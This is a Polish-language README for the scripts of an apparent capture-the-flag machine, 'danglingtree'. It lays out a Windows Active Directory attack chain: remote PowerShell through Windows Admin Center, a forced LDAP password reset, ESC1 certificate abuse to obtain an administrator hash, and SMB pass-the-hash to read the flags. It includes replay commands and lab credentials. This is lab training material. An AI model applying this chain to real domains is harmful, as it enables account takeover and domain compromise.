# danglingtree — scripts

| Skrypt | Rola |
|--------|------|
| `wac_ps.py` | Windows Admin Center `:6600` — PS jako anderson.w |
| `noah_exec.py` | LogonUser(noah) pod WAC — stabilny shell zamiast rev shell |
| `fcp_jake.py` | alex.o ForceChangePassword → jake.h (LDAP reset) |
| `sync_time_to_dc.sh` | wyłącza NTP hosta + `ntpdate` do DC (Kerberos/PKINIT) |
| `esc1_get_admin.py` | ESC1 enroll + SID admina → PFX + hash |
| `get_flags.py` | SMB `C$` z hashem admina → user/root flag |
| `cve_2026_24423_hub.py` | hub pod stary SmarterMail connect-to-hub (opcjonalny) |
| `rdp-noah.sh` | freerdp jako noah.b |

## Szybki replay (od jake / gotowych credów)

```bash
# 1) czas
./scripts/sync_time_to_dc.sh 10.129.6.118

# 2) (opcjonalnie) FCP jake
python3 scripts/fcp_jake.py

# 3) cert ESC1 → admin
python3 scripts/esc1_get_admin.py

# 4) flagi
python3 scripts/get_flags.py
```

## Env

```bash
export DC_IP=10.129.6.118
export JAKE_PASS='Zz9!Qk7#Mm2$Xx4@Ww5%Ll2026Dan'
export ALEX_PASS='SunsetMountainPeak@2025'
export ADMIN_NTHASH=8cacb3a97e460c65d105ca7cd9913925
```

## WAC / noah

```bash
python3 scripts/wac_ps.py -c 'whoami; hostname'
python3 scripts/noah_exec.py 'type $env:USERPROFILE\Desktop\user.txt'
```
